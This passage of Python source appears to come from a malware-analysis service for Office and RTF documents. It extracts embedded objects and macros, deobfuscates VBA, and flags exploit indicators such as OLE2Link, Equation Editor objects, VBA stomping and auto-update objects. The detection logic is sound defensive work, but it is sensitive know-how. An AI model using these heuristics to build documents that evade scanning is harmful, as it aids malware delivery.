        for i in range(18):
            try:
                str_len, *_ = struct.unpack("H", data[current_pos : current_pos + 2])
            except struct.error:
                self.log.warning("Could not get STTB metadata length, is the data truncated?")
                return None
            current_pos += 2
            str_len *= 2
            if str_len > 0:
                if i in sttb_fassoc_lut and str_len < 512:
                    safe_val = safe_str(data[current_pos : current_pos + str_len].decode("utf16", "ignore"))
                    json_body[sttb_fassoc_lut[i]] = safe_val
                current_pos += str_len
            else:
                continue

        if not json_body:
            return None
        link = json_body.get(sttb_fassoc_lut[1], "")
        heuristic, tags = self._process_link("attachedtemplate", link) if link else (None, {})
        return ResultSection(
            "OLE Alternate Metadata:",
            body=json.dumps(json_body),
            body_format=BODY_FORMAT.KEY_VALUE,
            heuristic=heuristic,
            tags=tags,
        )

    def _process_ole_clsid(self, ole: olefile.OleFileIO) -> ResultSection | None:
        """Create section for ole clsids.

        Args:
            ole: The olefile.

        Returns:
            A result section with the clsid of the file if it can be identified.
        """
        clsid_sec_json_body = dict()
        clsid_sec = ResultSection("CLSID:")
        if not ole.root or not ole.root.clsid:
            return None
        ole_clsid = ole.root.clsid
        if ole_clsid is None or ole_clsid in ['"', "'", ""] or ole_clsid in self.extracted_clsids:
            return None
        self.extracted_clsids.add(ole_clsid)
        clsid_sec.add_tag("file.ole.clsid", f"{safe_str(ole_clsid)}")
        clsid_desc = clsid.KNOWN_CLSIDS.get(ole_clsid, "unknown CLSID")
        if "CVE" in clsid_desc:
            for cve in re.findall(self.CVE_RE, clsid_desc):
                clsid_sec.add_tag("attribution.exploit", cve)
            if "Known" in clsid_desc or "exploit" in clsid_desc:
                clsid_sec.set_heuristic(52)
        clsid_sec_json_body[ole_clsid] = clsid_desc
        clsid_sec.set_body(json.dumps(clsid_sec_json_body), BODY_FORMAT.KEY_VALUE)
        return clsid_sec

    def _process_ole10native(self, stream_name: str, data: bytes, streams_section: ResultSection) -> bool:
        """Parse ole10native data and reports on suspicious content.

        Args:
            stream_name: Name of OLE stream.
            data: Ole10native data.
            streams_section: Ole10Native result section (must have heuristic set).

        Returns:
            If suspicious content is found
        """
        assert streams_section.heuristic

        suspicious = False
        sus_sec = ResultSection("Suspicious streams content:")
        native = oleobj.OleNativeStream(data)
        if not native.data or not native.filename or not native.src_path or not native.temp_path:
            self.log.warning("Failed to parse Ole10Native stream for sample %s", self.sha)
            return False
        self._extract_file(native.data, ".ole10native", f"Embedded OLE Stream {stream_name}")
        stream_desc = (
            f"{stream_name} ({native.filename}):\n\tFilepath: {native.src_path}"
            f"\n\tTemp path: {native.temp_path}\n\tData Length: {native.native_data_size}"
        )
        streams_section.add_line(stream_desc)
        # Tag Ole10Native header file labels
        streams_section.add_tag("file.name.extracted", native.filename)
        streams_section.add_tag("file.name.extracted", native.src_path)
        streams_section.add_tag("file.name.extracted", native.temp_path)
        streams_section.heuristic.increment_frequency()
        if find_pe_files(native.data):
            streams_section.heuristic.add_signature_id("embedded_pe_file")
        # handle embedded native macros
        if native.filename.endswith(".vbs") or native.temp_path.endswith(".vbs") or native.src_path.endswith(".vbs"):
            self.macros.append(safe_str(native.data))
        else:
            # Look for suspicious strings
            for pattern, desc in self.SUSPICIOUS_STRINGS:
                matched = re.search(pattern, native.data)
                if matched:
                    suspicious = True
                    if b"javascript" in desc:
                        sus_sec.add_subsection(
                            ResultSection("Suspicious string found: 'javascript'", heuristic=Heuristic(23))
                        )
                    if b"executable" in desc:
                        sus_sec.add_subsection(
                            ResultSection("Suspicious string found: 'executable'", heuristic=Heuristic(24))
                        )
                    else:
                        sus_sec.add_subsection(ResultSection("Suspicious string found", heuristic=Heuristic(25)))
                    sus_sec.add_line(
                        f"'{safe_str(matched.group(0))}' string found in stream "
                        f"{native.src_path}, indicating {safe_str(desc)}"
                    )

        if suspicious:
            streams_section.add_subsection(sus_sec)

        return True

    def _odf_with_macros(self, request: ServiceRequest) -> None:
        """Detect OpenDocument Format files containing macros.

        Inspired by https://github.com/pandora-analysis/pandora/blob/main/pandora/workers/odf.py

        Args:
            request: AL request object.

        Returns:
            None.
        """
        if request.file_type.startswith("document/odt"):
            for description in self._extracted_files.values():
                if (
                    "Basic/"
                    in description
                    # Have yet to find a sample that hits on these
                    # or "Script/" in description
                    # or "Object/" in description
                    # or "bin" in description
                ):
                    odf_res = ResultSection("ODF file may contain macro")
                    odf_res.add_line(
                        "The file contains an indicator (extracted file name in container) "
                        "that could be related to a macro"
                    )
                    request.result.add_section(odf_res)
                    break

    def _process_powerpoint_stream(self, data: bytes, streams_section: ResultSection) -> bool:
        """Parse powerpoint stream data and report on suspicious characteristics.

        Args:
            data: Powerpoint stream data.
            streams_section: Streams AL result section.

        Returns:
           If processing was successful.
        """
        try:
            powerpoint = PowerPointDoc(data)
            pp_line = "PowerPoint Document"
            if len(powerpoint.objects) > 0:
                streams_section.add_line(pp_line)
            for obj in powerpoint.objects:
                if obj.rec_type == "ExOleObjStg":
                    if obj.error is not None:
                        streams_section.add_line("\tError parsing ExOleObjStg stream. This is suspicious.")
                        if streams_section.heuristic:
                            streams_section.heuristic.increment_frequency()
                        else:
                            streams_section.set_heuristic(28)
                        continue

                    ole_hash = hashlib.sha256(obj.raw).hexdigest()
                    self._extract_file(obj.raw, ".pp_ole", "Embedded Ole Storage within PowerPoint Document Stream")
                    streams_section.add_line(
                        f"\tPowerPoint Embedded OLE Storage:\n\t\tSHA-256: {ole_hash}\n\t\t"
                        f"Length: {len(obj.raw)}\n\t\tCompressed: {obj.compressed}"
                    )
                    self.log.debug("Added OLE stream within a PowerPoint Document Stream: %s.pp_ole", ole_hash[:8])
        except Exception as e:
            self.log.warning("Failed to parse PowerPoint Document stream for sample %s", self.sha, exc_info=True)
            return False
        else:
            return True

    def _extract_swf_objects(self, sample_file: IO[bytes]) -> bool:
        """Search for embedded flash (SWF) content in sample.

        Args:
            sample_file: Sample content.

        Returns:
            If Flash content is found
        """
        swf_found = False
        # Taken from oletools.thirdparty.xxpyswf disneyland module
        # def disneyland(f, filename, options):
        retfind_swf = xxxswf.findSWF(sample_file)
        sample_file.seek(0)
        # for each SWF in file
        for x in retfind_swf:
            sample_file.seek(x)
            sample_file.read(1)
            sample_file.seek(x)
            swf = self._verify_swf(sample_file, x)
            if swf is None:
                continue
            self._extract_file(swf, ".swf", "Flash file extracted during sample analysis")
            swf_found = True
        return swf_found

    @staticmethod
    def _verify_swf(f: IO[bytes], x: int) -> bytes | None:
        """Confirm that embedded flash content (SWF) has properties of the documented format.

        Args:
            f: Sample content.
            x: Start of possible embedded flash content.

        Returns:
            Flash content if confirmed, or None.
        """
        # Slightly modified code taken from oletools.thirdparty.xxpyswf verifySWF
        # Start of SWF
        f.seek(x)
        # Read Header
        header = f.read(3)
        # Read Version
        version = struct.unpack("<b", f.read(1))[0]
        # Read SWF Size
        size = struct.unpack("<i", f.read(4))[0]
        # Start of SWF
        f.seek(x)
        if version > 40 or not isinstance(size, int) or header not in [b"CWS", b"FWS"]:
            return None

        # noinspection PyBroadException
        try:
            if header == b"FWS":
                swf_data = f.read(size)
            elif header == b"CWS":
                f.read(3)
                swf_data = b"FWS" + f.read(5) + zlib.decompress(f.read())
            else:
                # TODO: zws -- requires lzma in python 2.7
                return None
        except Exception:
            return None
        else:
            return swf_data

    def _extract_vb_hex(self, encodedchunk: bytes) -> bool:
        """Attempt to convert possible hex encoding to ascii.

        Args:
            encodedchunk: Data that may contain hex encoding.

        Returns:
            True if hex content converted.
        """
        decoded = b""

        # noinspection PyBroadException
        try:
            while encodedchunk != b"":
                decoded += binascii.a2b_hex(encodedchunk[2:4])
                encodedchunk = encodedchunk[4:]
        except Exception:
            # If it fails, assuming not a real byte sequence
            return False
        self._extract_file(decoded, ".hex.decoded", "Large hex encoded chunks detected during sample analysis")
        return True

    # -- RTF objects --

    def _extract_rtf(self, file_contents: bytes) -> ResultSection | None:
        """Handle RTF Packages.

        Args:
            file_contents: Contents of the submission

        Returns:
            A result section if any rtf results were found.
        """
        try:
            rtfp = rtfobj.RtfObjParser(file_contents)
            rtfp.parse()
        except Exception:
            self.log.debug("RtfObjParser failed to parse %s", self.sha, exc_info=True)
            return None  # Can't continue

        streams_res = ResultSection("RTF objects")
        if rtf_template_res := self._process_rtf_alternate_metadata(file_contents):
            streams_res.add_subsection(rtf_template_res)

        if b"\\objupdate" in file_contents:
            streams_res.add_subsection(
                ResultSection(
                    "RTF Object Update",
                    "RTF Object uses \\objupdate to update before being displayed."
                    " This can be used maliciously to load an object without user interaction.",
                    heuristic=Heuristic(54),
                )
            )

        sep = "-----------------------------------------"
        embedded = []
        linked = []
        unknown = []
        # RTF objdata
        for rtf_object in rtfp.objects:
            try:
                res_txt = ""
                res_alert = ""
                if rtf_object.is_ole:
                    res_txt += f"format_id: {rtf_object.format_id}\n"
                    res_txt += f"class name: {safe_str(rtf_object.class_name)}\n"
                    res_txt += f"data size: {rtf_object.oledata_size}\n"
                    if rtf_object.is_package:
                        res_txt = f"Filename: {rtf_object.filename}\n"
                        res_txt += f"Source path: {rtf_object.src_path}\n"
                        res_txt += f"Temp path = {rtf_object.temp_path}\n"

                        # check if the file extension is executable:
                        _, ext = os.path.splitext(rtf_object.filename)

                        if ext.encode().lower() in self.EXECUTABLE_EXTENSIONS:
                            res_alert += "CODE/EXECUTABLE FILE"
                        else:
                            # check if the file content is executable:
                            m = magic.Magic()
                            ftype = m.from_buffer(rtf_object.olepkgdata)
                            if "executable" in ftype:
                                res_alert += "CODE/EXECUTABLE FILE"
                    else:
                        res_txt += "Not an OLE Package"
                    # Supported by https://github.com/viper-framework/viper-modules/blob/00ee6cd2b2ad4ed278279ca9e383e48bc23a2555/rtf.py#L89
                    # Detect OLE2Link exploit
                    # http://www.kb.cert.org/vuls/id/921560
                    # Also possible indicator for https://nvd.nist.gov/vuln/detail/CVE-2023-36884
                    if rtf_object.class_name and rtf_object.class_name.upper() == b"OLE2LINK":
                        res_alert += (
                            "Possibly an exploit for the OLE2Link vulnerability "
                            "(VU#921560, CVE-2017-0199) or (CVE-2023-36884)"
                        )
                    # Inspired by https://github.com/viper-framework/viper-modules/blob/00ee6cd2b2ad4ed278279ca9e383e48bc23a2555/rtf.py#L89
                    # Detect Equation Editor exploit
                    # https://www.kb.cert.org/vuls/id/421280/
                    elif rtf_object.class_name and rtf_object.class_name.upper() == b"EQUATION.3":
                        res_alert += (
                            "Possibly an exploit for the Equation Editor vulnerability (VU#421280, CVE-2017-11882)"
                        )
                else:
                    if rtf_object.start is not None:
                        res_txt = f"{hex(rtf_object.start)} is not a well-formed OLE object"
                    else:
                        res_txt = "Malformed OLE Object"
                    if len(rtf_object.rawdata) >= self.LARGE_MALFORMED_BYTES:
                        res_alert += f"Data of malformed OLE object over {self.LARGE_MALFORMED_BYTES} bytes"
                        if streams_res.heuristic is None:
                            streams_res.set_heuristic(19)

                if rtf_object.format_id == oleobj.OleObject.TYPE_EMBEDDED:
                    embedded.append((res_txt, res_alert))
                elif rtf_object.format_id == oleobj.OleObject.TYPE_LINKED:
                    linked.append((res_txt, res_alert))
                else:
                    unknown.append((res_txt, res_alert))

                # Write object content to extracted file
                i = rtfp.objects.index(rtf_object)
                if rtf_object.is_package:
                    if rtf_object.filename:
                        fname = "_" + self._sanitize_filename(rtf_object.filename)
                    else:
                        fname = f"_object_{rtf_object.start}.noname"
                    self._extract_file(rtf_object.olepkgdata, fname, f"OLE Package in object #{i}:")

                # When format_id=TYPE_LINKED, oledata_size=None
                elif rtf_object.is_ole and rtf_object.oledata_size is not None:
                    # set a file extension according to the class name:
                    class_name = rtf_object.class_name.lower()
                    if class_name.startswith(b"word"):
                        ext = "doc"
                    elif class_name.startswith(b"package"):
                        ext = "package"
                    else:
                        ext = "bin"
                    fname = f"_object_{hex(rtf_object.start)}.{ext}"
                    self._extract_file(rtf_object.oledata, fname, f"Embedded in OLE object #{i}:")

                else:
                    fname = f"_object_{hex(rtf_object.start)}.raw"
                    self._extract_file(rtf_object.rawdata, fname, f"Raw data in object #{i}:")
            except Exception:
                self.log.warning("Failed to process an RTF object for sample %s:", self.sha, exc_info=True)
        if embedded:
            emb_sec = ResultSection(
                "RTF Embedded Object Details",
                body_format=BODY_FORMAT.MEMORY_DUMP,
                heuristic=Heuristic(21),
                parent=streams_res,
            )
            assert emb_sec.heuristic
            for txt, alert in embedded:
                emb_sec.add_line(sep)
                emb_sec.add_line(txt)
                if alert:
                    emb_sec.heuristic.add_signature_id("malicious_embedded_object")
                    for cve in re.findall(self.CVE_RE, alert):
                        emb_sec.add_tag("attribution.exploit", cve)
                    emb_sec.add_line(f"Malicious Properties found: {alert}")
        if linked:
            link_sec = ResultSection(
                "Linked Object Details",
                body_format=BODY_FORMAT.MEMORY_DUMP,
                heuristic=Heuristic(13),
                parent=streams_res,
            )
            assert link_sec.heuristic
            for txt, alert in linked:
                link_sec.add_line(txt)
                if alert != "":
                    for cve in re.findall(self.CVE_RE, alert):
                        link_sec.add_tag("attribution.exploit", cve)
                    link_sec.heuristic.add_signature_id("malicious_link_object", 1000)
                    link_sec.add_line(f"Malicious Properties found: {alert}")
        if unknown:
            unk_sec = ResultSection("Unknown Object Details", body_format=BODY_FORMAT.MEMORY_DUMP, parent=streams_res)
            is_suspicious = False
            for txt, alert in unknown:
                unk_sec.add_line(txt)
                if alert != "":
                    for cve in re.findall(self.CVE_RE, alert):
                        unk_sec.add_tag("attribution.exploit", cve)
                    is_suspicious = True
                    unk_sec.add_line(f"Malicious Properties found: {alert}")
            unk_sec.set_heuristic(Heuristic(14) if is_suspicious else None)

        if streams_res.body or streams_res.subsections:
            return streams_res
        return None

    def _process_rtf_alternate_metadata(self, data: bytes) -> ResultSection | None:
        """Extract RTF document metadata.

        http://www.biblioscape.com/rtf15_spec.htm#Heading9

        Args:
            data: Contents of the submission

        Returns:
            A result section with RTF info if found.
        """
        start_bytes = b"{\\*\\template"
        end_bytes = b"}"

        start_idx = data.find(start_bytes)
        if start_idx < 0:
            return None
        end_idx = data.find(end_bytes, start_idx)

        tplt_data = data[start_idx + len(start_bytes) : end_idx].decode("ascii", "ignore").strip()

        re_rtf_escaped_str = re.compile(r"\\(?:(?P<uN>u-?[0-9]+[?]?)|(?P<other>.))")

        def unicode_rtf_replace(matchobj: re.Match[str]) -> str:
            r"""Handle Unicode RTF Control Words, only \uN and escaped characters."""
            for match_name, match_str in matchobj.groupdict().items():
                if match_str is None:
                    continue
                if match_name == "uN":
                    match_int = int(match_str.strip("u?"))
                    if match_int < -1:
                        match_int = 0x10000 + match_int
                    return chr(match_int)
                if match_name == "other":
                    return match_str
            return matchobj.string

        link = re_rtf_escaped_str.sub(unicode_rtf_replace, tplt_data).encode("utf8", "ignore").strip()
        safe_link: str = safe_str(link)

        if safe_link:
            heuristic, tags = self._process_link("attachedtemplate", safe_link)
            rtf_tmplt_res = ResultSection("RTF Template:", heuristic=heuristic, tags=tags)
            rtf_tmplt_res.add_line(f"Path found: {safe_link}")
            return rtf_tmplt_res
        return None

    @staticmethod
    def _sanitize_filename(filename: str, replacement: str = "_", max_length: int = 200) -> str:
        """From rtfoby.py. Compute basename of filename. Replaces all non-whitelisted characters.

        Args:
            filename: Path to original sample.
            replacement: Character to replace non-whitelisted characters.
            max_length: Maximum length of the file name.

        Returns:
           Sanitized basename of the file.
        """
        basepath = os.path.basename(filename).strip()
        sane_fname = re.sub(r"[^\w.\- ]", replacement, basepath)

        while ".." in sane_fname:
            sane_fname = sane_fname.replace("..", ".")

        while "  " in sane_fname:
            sane_fname = sane_fname.replace("  ", " ")

        if not len(filename):
            sane_fname = "NONAME"

        # limit filename length
        if max_length:
            sane_fname = sane_fname[:max_length]

        return sane_fname

    # Macros
    def _check_for_macros(self, filename: str, request_hash: str) -> ResultSection | None:
        """Use VBA_Parser in Oletools to extract VBA content from sample.

        Args:
            filename: Path to original sample.
            file_contents: Original sample file content.
            request_hash: Original submitted sample's sha256hash.

        Returns: A result section with the error condition if macros couldn't be analyzed
        """
        # noinspection PyBroadException
        try:
            vba_parser = olevba.VBA_Parser(filename)

            # Get P-code
            try:
                if vba_parser.detect_vba_stomping():
                    self.vba_stomping = True
                pcode: str = safe_str(vba_parser.extract_pcode())
                # remove header
                pcode_l = pcode.split("\n", 2)
                if len(pcode_l) == 3:
                    self.pcode.append(pcode_l[2])
            except Exception:
                self.log.debug("pcodedmp.py failed to analyze pcode for sample %s", self.sha)

            # Get XLM Macros
            try:
                if vba_parser.detect_xlm_macros:
                    self.xlm_macros = vba_parser.xlm_macros
            except Exception:
                pass
            # Get Macros
            try:
                if vba_parser.detect_vba_macros():
                    # noinspection PyBroadException
                    try:
                        for _, stream_path, _, vba_code in vba_parser.extract_macros():
                            if stream_path in ("VBA P-code", "xlm_macro"):
                                continue
                            assert isinstance(vba_code, str)
                            if vba_code.strip() == "":
                                continue
                            vba_code_sha256 = hashlib.sha256(str(vba_code).encode()).hexdigest()
                            if vba_code_sha256 == request_hash:
                                continue

                            self.macros.append(vba_code)
                    except Exception:
                        self.log.debug(
                            "OleVBA VBA_Parser.extract_macros failed for sample %s:", self.sha, exc_info=True
                        )
                        section = ResultSection("OleVBA : Error extracting macros")
                        section.add_tag("technique.macro", "Contains VBA Macro(s)")
                        return section

            except Exception as e:
                self.log.debug("OleVBA VBA_Parser.detect_vba_macros failed for sample %s", self.sha, exc_info=True)
                return ResultSection(f"OleVBA : Error parsing macros: {e}")

        except Exception:
            self.log.debug(
                "OleVBA VBA_Parser constructor failed for sample %s, may not be a supported OLE document", self.sha
            )
        return None

    def _create_macro_sections(self, request_hash: str) -> ResultSection | None:
        """Create result section for the embedded macros of sample.

        Also extracts all macros and pcode content to individual files (all_vba_[hash].vba and all_pcode_[hash].data).

        Args:
            request_hash: Original submitted sample's sha256hash.
        """
        macro_section = ResultSection("OleVBA : Macros detected")
        macro_section.add_tag("technique.macro", "Contains VBA Macro(s)")
        # noinspection PyBroadException
        try:
            auto_exec: set[str] = set()
            suspicious: set[str] = set()
            network: set[str] = set()
            network_section = ResultSection("Potential host or network IOCs", heuristic=Heuristic(27, frequency=0))
            for vba_code in self.macros:
                analyzed_code = self._deobfuscator(vba_code)
                flag = self._flag_macro(analyzed_code)
                if self._macro_scanner(analyzed_code, auto_exec, suspicious, network, network_section) or flag:
                    vba_code_sha256 = hashlib.sha256(vba_code.encode()).hexdigest()
                    macro_section.add_tag("file.ole.macro.sha256", vba_code_sha256)
                    if not macro_section.heuristic and flag:
                        macro_section.add_line("Macro may be packed or obfuscated.")
                        macro_section.set_heuristic(20)

                    if analyzed_code != vba_code:
                        macro_section.add_tag("technique.obfuscation", "VBA Macro String Functions")

            if auto_exec:
                autoexecution = ResultSection(
                    "Autoexecution strings", heuristic=Heuristic(32), parent=macro_section, body="\n".join(auto_exec)
                )
                for keyword in auto_exec:
                    if keyword in AUTO_EXEC:
                        assert autoexecution.heuristic
                        autoexecution.heuristic.add_signature_id(keyword)
            if suspicious:
                sorted_suspicious = sorted(suspicious)
                signatures = {keyword.lower().replace(" ", "_"): 1 for keyword in sorted_suspicious}
                heuristic = Heuristic(30, signatures=signatures) if signatures else None
                macro_section.add_subsection(
                    ResultSection(
                        "Suspicious strings or functions", heuristic=heuristic, body="\n".join(sorted_suspicious)
                    )
                )
            if network:
                assert network_section.heuristic
                if network_section.heuristic.frequency == 0:
                    network_section.set_heuristic(None)
                network_section.add_line("\n".join(network))

            # Compare suspicious content macros to pcode, macros may have been stomped
            vba_sus, vba_matches = self._mraptor_check(self.macros, "all_vba", "vba_code", request_hash)
            pcode_sus, pcode_matches = self._mraptor_check(self.pcode, "all_pcode", "pcode", request_hash)
            _, xlm_matches = self._mraptor_check(self.xlm_macros, "xlm_macros", "XLM macros", request_hash)
            if self.xlm_macros:
                xlm_sec = ResultSection("XLM Macros", parent=macro_section, heuristic=Heuristic(51))
                for match in xlm_matches:
                    xlm_sec.add_line(match)
            if self.vba_stomping or pcode_matches and pcode_sus and not vba_sus:
                stomp_sec = ResultSection("VBA Stomping", heuristic=Heuristic(4))
                pcode_results = "\n".join(m for m in pcode_matches if m not in set(vba_matches))
                if pcode_results:
                    stomp_sec.add_subsection(
                        ResultSection("Suspicious content in pcode dump not found in macro dump:", body=pcode_results)
                    )
                    stomp_sec.add_line("Suspicious VBA content different in pcode dump than in macro dump content.")
                    assert stomp_sec.heuristic
                    stomp_sec.heuristic.add_signature_id("Suspicious VBA stomped", score=0)
                    vba_stomp_sec = ResultSection("Suspicious content in macro dump:", parent=stomp_sec)
                    vba_stomp_sec.add_lines(vba_matches)
                    if not vba_matches:
                        vba_stomp_sec.add_line("None.")
                macro_section.add_subsection(stomp_sec)

        except Exception as e:
            self.log.debug("OleVBA VBA_Parser.detect_vba_macros failed for sample %s:", self.sha, exc_info=True)
            section = ResultSection(f"OleVBA : Error parsing macros: {e}")
            macro_section.add_subsection(section)
        return macro_section if macro_section.subsections else None

    # TODO: may want to eventually pull this out into a Deobfuscation helper that supports multi-languages

    def _deobfuscator(self, text: str) -> str:
        """Attempt to identify and decode multiple types of char obfuscation in VBA code.

        Args:
            text: Original VBA code.

        Returns:
            Original text, or deobfuscated text if specified techniques are detected.
        """
        deobf = text
        # noinspection PyBroadException
        try:
            # leading & trailing quotes in each local function are to facilitate the final re.sub in deobfuscator()

            # repeated chr(x + y) calls seen in wild, as per SANS ISC diary from May 8, 2015
            def deobf_chrs_add(m: re.Match[str]) -> str:
                if m.group(0):
                    i = int(m.group(1)) + int(m.group(2))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}"'
                return ""

            deobf = re.sub(self.CHR_ADD_RE, deobf_chrs_add, deobf, flags=re.IGNORECASE)

            def deobf_unichrs_add(m: re.Match[str]) -> str:
                result = ""
                if m.group(0):
                    result = m.group(0)

                    i = int(m.group(1)) + int(m.group(2))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        result = f'"{chr(i)}"'
                return result

            deobf = re.sub(self.CHRW_ADD_RE, deobf_unichrs_add, deobf, flags=re.IGNORECASE)

            # suspect we may see chr(x - y) samples as well
            def deobf_chrs_sub(m: re.Match[str]) -> str:
                if m.group(0):
                    i = int(m.group(1)) - int(m.group(2))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}"'
                return ""

            deobf = re.sub(self.CHR_SUB_RE, deobf_chrs_sub, deobf, flags=re.IGNORECASE)

            def deobf_unichrs_sub(m: re.Match[str]) -> str:
                if m.group(0):
                    i = int(m.group(1)) - int(m.group(2))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        return f'"{chr(i)}"'
                return ""

            deobf = re.sub(self.CHRW_SUB_RE, deobf_unichrs_sub, deobf, flags=re.IGNORECASE)

            def deobf_chr(m: re.Match[str]) -> str:
                if m.group(1):
                    i = int(m.group(1))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}"'
                return ""

            deobf = re.sub(self.CHR_RE, deobf_chr, deobf, flags=re.IGNORECASE)

            def deobf_unichr(m: re.Match[str]) -> str:
                if m.group(1):
                    i = int(m.group(1))

                    # chr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        return f'"{chr(i)}"'
                return ""

            deobf = re.sub(self.CHRW_RE, deobf_unichr, deobf, flags=re.IGNORECASE)

            # handle simple string concatenations
            deobf = re.sub('" & "', "", deobf)

        except Exception:
            self.log.debug("Deobfuscator regex failure for sample %s, reverting to original text", self.sha)
            deobf = text

        return deobf

    def _flag_macro(self, macro_text: str) -> bool:
        """Flag macros with obfuscated variable names.

        We score macros based on the proportion of English trigraphs in the code,
        skipping over some common keywords.

        Args:
            macro_text: Macro string content.

        Returns:
            True if the score is lower than self.macro_score_min_alert
            (indicating macro is possibly malicious).
        """
        if self.macro_score_max_size is not None and len(macro_text) > self.macro_score_max_size:
            return False

        macro_text = macro_text.lower()
        score = 0.0

        word_count = 0
        byte_count = 0

        for macro_word in re.finditer(self.MACRO_WORDS_RE, macro_text):
            word = macro_word.group(0)
            word_count += 1
            byte_count += len(word)
            if word in self.MACRO_SKIP_WORDS:
                continue
            prefix = word[0]
            tri_count = 0
            for i in range(1, len(word) - 1):
                trigraph = word[i : i + 2]
                if trigraph in self.word_chains.get(prefix, []):
                    tri_count += 1
                prefix = word[i]

            score += tri_count / (len(word) - 2)

        if byte_count < 128 or word_count < 32:
            # these numbers are arbitrary, but if the sample is too short the score is worthless
            return False

        # A lower score indicates more randomized text, random variable/function names are common in malicious macros
        return (score / word_count) < self.macro_score_min_alert

    def _macro_scanner(
        self,
        text: str,
        autoexecution: set[str],
        suspicious: set[str],
        network: set[str],
        network_section: ResultSection,
    ) -> bool:
        """Scan the text of a macro with VBA_Scanner and collect results.

        Args:
            text: Original VBA code.
            autoexecution: Set for adding autoexecution strings
            suspicious: Set for adding suspicious strings
            network: Set for adding host/network strings
            network_section: Section for tagging network results

        Returns:
            Whether interesting results were found.
        """
        try:
            vba_scanner = olevba.VBA_Scanner(text)
            vba_scanner.scan(include_decoded_strings=True)

            for string in self.ADDITIONAL_SUSPICIOUS_KEYWORDS:
                if re.search(string, text, re.IGNORECASE):
                    # play nice with detect_suspicious from olevba.py
                    suspicious.add(string.lower())

            if vba_scanner.autoexec_keywords is not None:
                for keyword, _ in vba_scanner.autoexec_keywords:
                    autoexecution.add(keyword.lower())

            if vba_scanner.suspicious_keywords is not None:
                for keyword, _ in vba_scanner.suspicious_keywords:
                    suspicious.add(keyword.lower())

            assert network_section.heuristic
            assert network_section.heuristic.frequency is not None
            freq = network_section.heuristic.frequency
            if vba_scanner.iocs is not None:
                for keyword, description in vba_scanner.iocs:
                    # olevba seems to have swapped the keyword for description during iocs extraction
                    # this holds true until at least version 0.27
                    if isinstance(description, str):
                        description = description.encode("utf-8", errors="ignore")

                    desc_ip = re.match(self.IP_RE, description)
                    uri, tag_type, tag = self.parse_uri(description)
                    if uri:
                        network.add(f"{keyword}: {uri}")
                        if not self.is_safelisted("network.static.uri", uri) and not self.is_safelisted(tag_type, tag):
                            network_section.heuristic.increment_frequency()
                        network_section.add_tag("network.static.uri", uri)
                        if tag and tag_type:
                            network_section.add_tag(tag_type, tag)
                    elif desc_ip:
                        ip_str = safe_str(desc_ip.group(1))
                        if not is_ip_reserved(ip_str):
                            if not self.is_safelisted("network.static.ip", ip_str):
                                network_section.heuristic.increment_frequency()
                            network_section.add_tag("network.static.ip", ip_str)
                    else:
                        network.add(f"{keyword}: {safe_str(description)}")

            return bool(
                vba_scanner.autoexec_keywords
                or vba_scanner.suspicious_keywords
                or freq < network_section.heuristic.frequency
            )

        except Exception:
            self.log.warning("OleVBA VBA_Scanner constructor failed for sample %s:", self.sha, exc_info=True)
            return False

    def _mraptor_check(
        self, macros: list[str], filename: str, description: str, request_hash: str
    ) -> tuple[bool, list[str]]:
        """Extract combined macros and analyze with MacroRaptor."""
        combined = "\n".join(macros)
        if combined:
            data = combined.encode()
            combined_sha256 = hashlib.sha256(data).hexdigest()
            if combined_sha256 != request_hash:
                self._extract_file(data, f"_{filename}.data", description)

        assert self.request
        passwords = re.findall('PasswordDocument:="([^"]+)"', combined)
        if "passwords" in self.request.temp_submission_data:
            self.request.temp_submission_data["passwords"].extend(passwords)
        else:
            self.request.temp_submission_data["passwords"] = passwords
        rawr_combined = mraptor.MacroRaptor(combined)
        rawr_combined.scan()
        return rawr_combined.suspicious, rawr_combined.matches

    # -- XML --

    def _check_xml_strings(self, path: str, result: Result, include_fpos: bool = False) -> None:
        """Search xml content for external targets, indicators, and base64 content.

        Args:
            path: Path to original sample.
            result: Result sections are added to this result.
            include_fpos: Whether to include possible false positives in results.
        """
        xml_ioc_res = ResultSection("IOCs content:", heuristic=Heuristic(7, frequency=0))
        xml_b64_res = ResultSection("Base64 content:")
        xml_big_res = ResultSection("Files too large to be fully scanned", heuristic=Heuristic(3, frequency=0))

        external_links: set[tuple[str, str]] = set()
        ioc_files: Mapping[str, list[str]] = defaultdict(list)
        # noinspection PyBroadException
        try:
            xml_extracted = set()
            with zipfile.ZipFile(path) as z:
                if section := self._process_ooxml_properties(z):
                    result.add_section(section)
                for f in z.namelist():
                    try:
                        contents = z.open(f).read()
                    except zipfile.BadZipFile:
                        continue

                    try:
                        # Deobfuscate xml using parser
                        parsed = etree.XML(contents, None)
                        has_external = self._find_external_links(parsed)
                        data = etree.tostring(parsed)
                    except Exception:
                        # Use raw if parsing fails
                        data = contents
                        has_external = re.findall(self.EXTERNAL_LINK_RE, data)

                    if len(data) > self.MAX_XML_SCAN_CHARS:
                        data = data[: self.MAX_XML_SCAN_CHARS]
                        xml_big_res.add_line(f"{f}")
                        assert xml_big_res.heuristic
                        xml_big_res.heuristic.increment_frequency()

                    external_links.update(has_external)
                    has_dde = re.search(rb"ddeLink", data)  # Extract all files with dde links
                    has_script = re.search(self.JAVASCRIPT_RE, data)  # Extract all files with javascript
                    extract_regex = bool(has_external or has_dde or has_script)

                    # Check for IOC and b64 data in XML
                    iocs, extract_ioc = self._check_for_patterns(data, include_fpos)
                    if iocs:
                        for tag_type, tags in iocs.items():
                            for tag in sorted(tags):
                                ioc_files[tag_type + safe_str(tag)].append(f)
                                xml_ioc_res.add_tag(tag_type, tag)

                    f_b64res = self._check_for_b64(data, f)
                    if f_b64res:
                        f_b64res.set_heuristic(8)
                        xml_b64_res.add_subsection(f_b64res)

                    # all vba extracted anyways
                    if (extract_ioc or f_b64res or extract_regex or include_fpos) and not f.endswith("vbaProject.bin"):
                        xml_sha256 = hashlib.sha256(contents).hexdigest()
                        if xml_sha256 not in xml_extracted:
